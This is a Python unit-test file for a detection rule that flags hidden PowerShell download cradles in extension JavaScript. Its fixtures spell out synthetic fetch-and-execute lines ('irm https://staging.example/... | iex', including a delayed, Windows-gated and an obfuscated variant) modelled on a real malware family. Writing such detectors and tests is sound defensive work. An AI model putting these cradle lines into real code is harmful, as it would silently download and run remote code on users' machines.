"""Fire / silent / FP-guard unit tests for the S11 download-cradle rule.

Inputs are SYNTHETIC — they reproduce the kagema / ``ShowSnowcrypto.SnowShoNo``
PoC's *shape* (child_process sink -> hidden PowerShell -> ``irm <url> | iex``
fetch-and-execute cradle) with a reserved ``staging.example`` host, never the
real sample or its (redacted) C2. No live malware enters the repo (see the
detection-design README safety section).
"""

from __future__ import annotations

from collections.abc import Callable

from static_runtime.context import StaticAnalysisContext
from static_runtime.rules.s11_download_cradle import DownloadCradleRule

MakeContext = Callable[..., StaticAnalysisContext]

# The kagema cradle shape, declawed: synthetic staging host, no real C2. One
# child_process sink + the ordered powershell -> irm -> iex cradle on one line,
# inside a win32-gated, setTimeout-delayed activate() (the family's structure).
_CRADLE = """
const cp = require("child_process");
function activate() {
  if (process.platform !== "win32") return;
  setTimeout(() => {
    cp.exec(
      'powershell -WindowStyle Hidden -Command "irm https://staging.example/aaa | iex"',
      { windowsHide: true }
    );
  }, 2000);
}
exports.activate = activate;
"""


def test_fires_critical_on_download_cradle(make_context: MakeContext) -> None:
    ctx = make_context(files={"extension.js": _CRADLE})
    findings = DownloadCradleRule().evaluate(ctx)
    assert len(findings) == 1
    finding = findings[0]
    assert finding.rule_id == "extrace.s11.download_cradle"
    assert finding.severity.value == "critical"
    assert finding.confidence.value == "high"
    # Class-less per the static-IOC convention; A4 is conceptual (spec §7).
    assert finding.adversary_class is None
    assert "attack.T1105" in finding.categories
    assert "extrace.ext.download_cradle" in finding.categories
    assert finding.evidence  # at least the cradle line is cited


def test_fires_on_invoke_restmethod_expression_longhand(
    make_context: MakeContext,
) -> None:
    # Longhand verbs (Invoke-RestMethod / Invoke-Expression) and pwsh instead of
    # powershell still trip the cradle conjunct.
    src = (
        'const { execSync } = require("child_process");\n'
        'execSync(`pwsh -nop -w hidden -c "Invoke-RestMethod '
        'https://staging.example/s | Invoke-Expression"`);'
    )
    ctx = make_context(files={"ext.js": src})
    assert len(DownloadCradleRule().evaluate(ctx)) == 1


def test_fires_under_string_array_obfuscation(make_context: MakeContext) -> None:
    # obfuscator.io renames identifiers but leaves string literals in cleartext,
    # so the cradle command survives in the literal pool and the regex recovers it.
    src = (
        'const _0x1a2b=require("child_process");'
        'const _0x3c4d=["powershell -w hidden irm https://staging.example/a | iex"];'
        "_0x1a2b[_0x5e6f(0x0)](_0x3c4d[0x0]);"
    )
    ctx = make_context(files={"extension.js": src})
    assert len(DownloadCradleRule().evaluate(ctx)) == 1


def test_silent_for_child_process_only(make_context: MakeContext) -> None:
    # A build/lint extension shells out — no cradle.
    ctx = make_context(
        files={"extension.js": 'require("child_process").exec("npm run build");'}
    )
    assert DownloadCradleRule().evaluate(ctx) == []


def test_silent_for_powershell_mention_only(make_context: MakeContext) -> None:
    # A terminal-profile extension references powershell but runs no cradle.
    src = (
        'const cp = require("child_process");\n'
        'cp.spawn("powershell.exe", ["-NoProfile", "-File", "./setup.ps1"]);'
    )
    ctx = make_context(files={"extension.js": src})
    assert DownloadCradleRule().evaluate(ctx) == []


def test_silent_for_scattered_tokens(make_context: MakeContext) -> None:
    # The load-bearing FP guard: a large bundle that mentions powershell,
    # a real download verb (Invoke-WebRequest), and an `iex` identifier all
    # appear, but on SEPARATE lines, far apart and unrelated. A loose file-level
    # AND of the four token classes would match this (and does false-positive on
    # real bundles like GitHub.copilot-chat's dist/cli.js); the ordered
    # single-line span match correctly stays silent — the cradle never forms.
    src = (
        'const cp = require("child_process");\n'
        "// on Windows the optional installer shells out to powershell\n"
        "function fetchManifest() { return Invoke-WebRequest(url); }\n"
        "// the loop index below is unrelated\n"
        "let iex = 0; for (iex = 0; iex < items.length; iex++) handle(iex);\n"
    )
    ctx = make_context(files={"extension.js": src})
    assert DownloadCradleRule().evaluate(ctx) == []


def test_silent_for_cradle_without_child_process_sink(
    make_context: MakeContext,
) -> None:
    # The cradle string with no child_process sink stays silent here by design
    # (the conjunction requires the exec sink); the semgrep download_cradle
    # advisory rule covers the cradle-string-alone case at MEDIUM/WARN.
    src = 'const note = "powershell -w hidden irm https://staging.example/a | iex";'
    ctx = make_context(files={"extension.js": src})
    assert DownloadCradleRule().evaluate(ctx) == []
